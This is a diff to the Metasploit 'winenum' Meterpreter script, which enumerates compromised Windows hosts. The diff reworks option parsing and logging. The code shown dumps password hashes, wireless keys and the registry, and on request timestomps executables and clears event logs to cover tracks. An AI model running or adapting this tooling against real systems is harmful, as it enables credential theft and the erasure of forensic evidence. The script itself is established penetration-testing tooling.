@@ -10,6 +10,39 @@
 #      the code to be re-used.
 #Contributor: natron (natron 0x40 invisibledenizen 0x2E com) (Process Migration Functions)
 ################## Variable Declarations ##################
+
+opts = Rex::Parser::Arguments.new(
+	"-h" => [ false, "Help menu." ],
+	"-m" => [ false, "Migrate the Meterpreter Session from it current process to a new cmd.exe before doing anything" ],
+	"-r" => [ false, "Dump, compress and download entire Registry" ],
+	"-c" => [ false, "Change Access, Modified and Created times of executables that were run on the target machine and clear the EventLog" ]
+)
+
+rd = nil
+mg = nil
+cm = nil
+opts.parse(args) { |opt, idx, val|
+	case opt
+	when '-r'
+		rd = 1
+	when '-m'
+		mg = 1
+	when '-c'
+		cm = 1
+	when "-h"
+		print_line "WinEnum -- Windows local enumeration"
+		print_line
+		print_line "Retrieves all kinds of information about the system"
+		print_line "including environment variables, network interfaces,"
+		print_line "routing, user accounts, and much more.  Results are"
+		print_line "stored in #{::File.join(Msf::Config.log_directory, 'winenum')}"
+		print_line(opts.usage)
+		raise Rex::Script::Completed
+	end
+}
+
+#-------------------------------------------------------------------------------
+
 session = client
 host,port = session.tunnel_peer.split(':')
 
@@ -17,7 +50,7 @@ host,port = session.tunnel_peer.split(':')
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.config_directory, 'logs', 'winenum', host + filenameinfo )
+logs = ::File.join(Msf::Config.log_directory, 'winenum', host + filenameinfo )
 
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
@@ -446,17 +479,6 @@ def filewrt(file2wrt, data2wrt)
 end
 #-------------------------------------------------------------------------------
 
-# Function for Usage
-def usage
-	print_line("Windows Local Enumerion Meterpreter Script ")
-	print_line("Usage:\n")
-	print_line("-h\tThis help message.\n")
-	print_line("-m\tMigrates the Meterpreter Session from it current process to a new one\n")
-	print_line("-c\tChanges Access Time, Modified Time and Created Time of executables")
-	print_line("  \tthat where run on the target machine and clear the EventLog\n")
-	print_line("-r\tDumps, compresses and download entire Registry\n")
-end
-#-------------------------------------------------------------------------------
 # Function for dumping Registry keys that contain wireless configuration settings for Vista and XP 
 # This keys can later be imported into a Windows client for conection or key extraction.
 def dumpwlankeys(session,pathoflogs,filename)
@@ -593,109 +615,88 @@ def uaccheck(session)
         return uac
 end
 ################## MAIN ##################
-# Parsing of Options
-rd = nil
-mg = nil
-cm = nil
-helpopt = nil
-args.each do |opt|
-	case opt
 
-	when '-h'
-		usage
-		helpopt = 1
-	when '-r'
-		rd = 1
-	when '-m'
-		mg = 1
-	when '-c'
-		cm = 1
+# Execute Functions selected
+if (mg != nil)
+	migrate(session)
+end
+# Main part of script, it will run all function minus the ones
+# that will chance the MACE and Clear the Eventlog.
+print_status("Running Windows Local Enumerion Meterpreter Script")
+print_status("New session on #{host}:#{port}...")
+
+# Header for File that will hold all the output of the commands
+info = session.sys.config.sysinfo
+header =  "Date:       #{::Time.now.strftime("%Y-%m-%d.%H:%M:%S")}\n"
+header << "Running as: #{client.sys.config.getuid}\n"
+header << "Host:       #{info['Computer']}\n"
+header << "OS:         #{info['OS']}\n"
+header << "\n\n\n"
+print_status("Saving report to #{dest}")
+filewrt(dest,header)
+filewrt(dest,chkvm(session))
+trgtos = info['OS']
+uac = uaccheck(session)
+# Run Commands according to OS some commands are not available on all versions of Windows
+if trgtos =~ /(Windows XP)/
+	filewrt(dest,list_exec(session,commands))
+	filewrt(dest,wmicexec(session,wmic))
+	filewrt(dest,findprogs(session))
+	dumpwlankeys(session,logs,filenameinfo)
+	filewrt(dest,gethash(session))
+elsif trgtos =~ /(Windows .NET)/
+	filewrt(dest,list_exec(session,commands))
+	filewrt(dest,wmicexec(session,wmic))
+	filewrt(dest,findprogs(session))
+	filewrt(dest,gethash(session))
+elsif trgtos =~ /(Windows 2008)/
+	filewrt(dest,list_exec(session,commands + win2k8cmd))
+	#filewrt(dest,wmicexec(session,wmic))
+	#filewrt(dest,findprogs(session))
+	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
+		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows 2008 if not System.")
+	else
+		filewrt(dest,gethash(session))
+	end
+elsif trgtos =~ /(Windows Vista)/ or trgtos =~ /(Windows 7)/
+	filewrt(dest,list_exec(session,commands + vstwlancmd))
+	filewrt(dest,wmicexec(session,wmic))
+	filewrt(dest,findprogs(session))
+	if not uac
+		dumpwlankeys(session,logs,filenameinfo) 
+	else
+		print_status("UAC is enabled, Wireless key Registry could not be dumped under current privileges")
+	end
+	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
+		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista or Windows 7 if not System.")
+	else
+		filewrt(dest,gethash(session))
+	end
+elsif trgtos =~ /(Windows 2000)/
+	filewrt(dest,list_exec(session,commands - nonwin2kcmd))
+	filewrt(dest,gethash(session))
+end
+
+#filewrt(dest,gethash(session))
+filewrt(dest,listtokens(session))
+if (rd != nil)
+	if not uac
+		regdump(session,logs,filenameinfo) 
+		filewrt(dest,"Registry was dumped and downloaded")
+	else
+		print_status("UAC is enabled, Registry Keys could not be dumped under current privileges")
 	end
 end
-if helpopt != 1
-	# Execute Functions selected
-
-	if (mg != nil)
-		migrate(session)
-	end
-	# Main part of script, it will run all function minus the ones
-	# that will chance the MACE and Clear the Eventlog.
-	print_status("Running Windows Local Enumerion Meterpreter Script")
-	print_status("New session on #{host}:#{port}...")
-
-	# Header for File that will hold all the output of the commands
-	info = session.sys.config.sysinfo
-	header =  "Date:       #{::Time.now.strftime("%Y-%m-%d.%H:%M:%S")}\n"
-	header << "Running as: #{client.sys.config.getuid}\n"
-	header << "Host:       #{info['Computer']}\n"
-	header << "OS:         #{info['OS']}\n"
-	header << "\n\n\n"
-	print_status("Saving report to #{dest}")
-	filewrt(dest,header)
-	filewrt(dest,chkvm(session))
-	trgtos = info['OS']
-	uac = uaccheck(session)
-	# Run Commands according to OS some commands are not available on all versions of Windows
-	if trgtos =~ /(Windows XP)/
-		filewrt(dest,list_exec(session,commands))
-		filewrt(dest,wmicexec(session,wmic))
-		filewrt(dest,findprogs(session))
-		dumpwlankeys(session,logs,filenameinfo)
-		filewrt(dest,gethash(session))
-	elsif trgtos =~ /(Windows .NET)/
-		filewrt(dest,list_exec(session,commands))
-		filewrt(dest,wmicexec(session,wmic))
-		filewrt(dest,findprogs(session))
-		filewrt(dest,gethash(session))
-	elsif trgtos =~ /(Windows 2008)/
-		filewrt(dest,list_exec(session,commands + win2k8cmd))
-		#filewrt(dest,wmicexec(session,wmic))
-		#filewrt(dest,findprogs(session))
-		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
-			print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows 2008 if not System.")
-		else
-			filewrt(dest,gethash(session))
-		end
-	elsif trgtos =~ /(Windows Vista)/ or trgtos =~ /(Windows 7)/
-		filewrt(dest,list_exec(session,commands + vstwlancmd))
-		filewrt(dest,wmicexec(session,wmic))
-		filewrt(dest,findprogs(session))
+if (cm != nil)
+	filewrt(dest,"EventLogs where Cleared")
+	if trgtos =~ /(Windows 2000)/
+		covertracks(session,cmdstomp - nowin2kexe)
+	else
 		if not uac
-			dumpwlankeys(session,logs,filenameinfo) 
+			covertracks(session,cmdstomp)
 		else
-			print_status("UAC is enabled, Wireless key Registry could not be dumped under current privileges")
-		end
-		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
-			print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista or Windows 7 if not System.")
-		else
-			filewrt(dest,gethash(session))
-		end
-	elsif trgtos =~ /(Windows 2000)/
-		filewrt(dest,list_exec(session,commands - nonwin2kcmd))
-		filewrt(dest,gethash(session))
-	end
-
-	#filewrt(dest,gethash(session))
-	filewrt(dest,listtokens(session))
-	if (rd != nil)
-		if not uac
-			regdump(session,logs,filenameinfo) 
-			filewrt(dest,"Registry was dumped and downloaded")
-		else
-			print_status("UAC is enabled, Registry Keys could not be dumped under current privileges")
+			print_status("UAC is enabled, Logs could not be cleared under current privileges")
 		end
 	end
-	if (cm != nil)
-		filewrt(dest,"EventLogs where Cleared")
-		if trgtos =~ /(Windows 2000)/
-			covertracks(session,cmdstomp - nowin2kexe)
-		else
-			if not uac
-				covertracks(session,cmdstomp)
-			else
-				print_status("UAC is enabled, Logs could not be cleared under current privileges")
-			end
-		end
-	end
-	print_status("Done!")
 end
+print_status("Done!")
